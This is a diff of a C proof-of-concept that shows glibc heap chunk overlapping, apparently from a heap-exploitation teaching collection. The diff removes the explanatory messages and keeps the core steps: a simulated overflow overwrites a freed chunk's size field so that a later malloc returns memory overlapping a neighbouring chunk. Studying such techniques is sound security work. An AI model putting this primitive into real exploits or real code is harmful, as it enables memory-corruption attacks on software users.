@@ -41,60 +41,31 @@ int main(int argc , char* argv[])
 	setbuf(stdout, NULL);
 
 	long *p1,*p2,*p3,*p4;
-	printf("\nThis is another simple chunks overlapping problem\n");
-	printf("The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"
-		   "which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n"
-		   "and the prev_size of it must match the unsortedbin's size\n"
-		   "This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n");
 
-	printf("Let's start to allocate 4 chunks on the heap\n");
-
-	// Allocate chunks
 	p1 = malloc(0x80 - 8);
 	p2 = malloc(0x500 - 8);
 	p3 = malloc(0x80 - 8);
-
-	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);
 
 	memset(p1, '1', 0x80 - 8);
 	memset(p2, '2', 0x500 - 8);
 	memset(p3, '3', 0x80 - 8);
 
-	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
-	int evil_chunk_size = 0x581; // 0x500 (p2) + 0x80 (p3) + 1 (PREV_INUSE)
+	int evil_chunk_size = 0x581; 
 	int evil_region_size = 0x580 - 8;
-	printf("We are going to set the size of chunk p2 to %d, which gives us\na region size of %d\n",
-		 evil_chunk_size, evil_region_size);
 
-	/* VULNERABILITY: Overwrite the size field of chunk p2 */
+	// VULNERABILITY: Overwrite the size field of chunk p2
 	*(p2-1) = evil_chunk_size;
 
-	printf("\nNow let's free the chunk p2\n");
 	free(p2);
-	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");
 
-	printf("\nNow let's allocate another chunk with a size equal to the data\n"
-	       "size of the chunk p2 injected size\n");
-
-	// This malloc will return the memory starting at p2, but extending through p3
+	// Returns memory starting at p2, but extending through p3
 	p4 = malloc(evil_region_size);
 
-	printf("\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
-	printf("p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
-	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");
-
-	// Demonstrate the overlap
-	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
 	memset(p4, '4', evil_region_size);
-	printf("p4 = %s\n", (char *)p4);
-	printf("p3 = %s\n", (char *)p3);
-
-	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
 	memset(p3, '3', 80);
-	printf("p4 = %s\n", (char *)p4);
-	printf("p3 = %s\n", (char *)p3);
 
 	assert(strstr((char *)p4, (char *)p3));
+	return 0;
 }
 ```
 
